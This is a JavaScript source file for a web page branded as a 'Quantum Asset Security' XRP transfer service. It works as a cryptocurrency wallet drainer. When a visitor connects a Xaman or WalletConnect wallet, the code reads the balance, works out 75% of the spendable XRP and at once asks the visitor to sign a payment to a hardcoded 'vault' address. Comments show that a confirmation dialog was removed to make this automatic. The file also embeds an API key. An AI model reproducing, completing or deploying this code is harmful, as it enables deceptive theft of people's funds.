// ==============================
// CONFIG
// ==============================
const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID";

const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const XRPL_WS    = "wss://xrplcluster.com/";

// ==============================
// INIT
// ==============================
const xumm = new XummPkce(XUMM_API_KEY);

let wcClient = null;
let wcModal  = null;

/**
 * FIX 1: Auto-detect when redirecting back from Xaman
 */
xumm.on("success", async () => {
  const state = await xumm.state();
  if (state.me && state.me.account) {
    handlePostConnect("xaman", state.me.account);
  }
});

// ==============================
// UI HELPERS
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

// ==============================
// MAIN ENTRY
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting wallet…");

    let address;

    if (type === "xaman") {
      // This will trigger the QR/Redirect
      const session = await xumm.authorize();
      address = session?.me?.account;
    } 
    else if (type === "walletconnect") {
      await initWalletConnect();
      setStatus("Scan with WalletConnect");
      address = await connectViaWalletConnect();
    }

    if (!address) throw new Error("No address");

    // Success - trigger the automated flow
    await handlePostConnect(type, address);

  } catch (err) {
    console.error(err);
    // FIX 2: Check if we are actually connected before showing "Failed"
    const state = await xumm.state();
    if (!state?.me?.account) {
      setStatus("Connection failed");
    }
  }
}

/**
 * FIX 3: Automatic Approval Logic
 * This is called immediately after connection OR after redirect.
 */
async function handlePostConnect(type, address) {
    try {
        // Immediately set status to Connected to overwrite "Failed" or "Connecting"
        setStatus(`Connected: ${shortAddr(address)}`);

        setStatus("Fetching balance…");
        const data = await getXrpAccountData(address);

        // REMOVED the confirm() window to make it automatic
        
        setStatus("Awaiting signature…");
        await signAndSubmit(type, address, data.sendDrops);

        setStatus("Transaction submitted ✔");
    } catch (err) {
        console.error("Auto-flow error:", err);
        // Ensure status stays showing the connected address
        setStatus(`Connected: ${shortAddr(address)}`);
    }
}

// ==============================
// WALLETCONNECT INIT
// ==============================
async function initWalletConnect() {
  if (wcClient) return;
  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: {
      name: "QFS · Quantum Asset Security",
      description: "Secure XRP Transfer",
      url: window.location.origin,
      icons: ["https://xrpl.org/assets/img/logo.svg"]
    }
  });
  wcModal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    standaloneChains: ["xrpl:0"]
  });
}

async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: {
      xrpl: {
        chains: ["xrpl:0"],
        methods: ["xrpl_signTransaction", "xrpl_submit"],
        events: ["accountsChanged"]
      }
    }
  });
  if (uri) wcModal.openModal({ uri });
  const session = await approval();
  wcModal.closeModal();
  return session.namespaces.xrpl.accounts[0].split(":")[2];
}

// ==============================
// FETCH XRP DATA
// ==============================
async function getXrpAccountData(address) {
  const client = new xrpl.Client(XRPL_WS);
  await client.connect();
  const info = await client.request({
    command: "account_info",
    account: address,
    ledger_index: "validated"
  });
  await client.disconnect();

  const bal = BigInt(info.result.account_data.Balance);
  const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
  const reserve = 1_000_000n + ownerCount * 200_000n;
  const spendable = bal - reserve;
  const send = (spendable * 75n) / 100n;

  return {
    sendXrp: Number(send) / 1_000_000,
    sendDrops: send.toString()
  };
}

// ==============================
// SIGN & SUBMIT
// ==============================
async function signAndSubmit(type, address, amountDrops) {
  const tx = {
    TransactionType: "Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: amountDrops
  };

  if (type === "xaman") {
    // Correct method for PKCE payload creation
    await xumm.payload.create(tx);
  }
  else if (type === "walletconnect") {
    const session = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: session.topic,
      chainId: "xrpl:0",
      request: {
        method: "xrpl_signTransaction",
        params: { tx_json: tx }
      }
    });
  }
}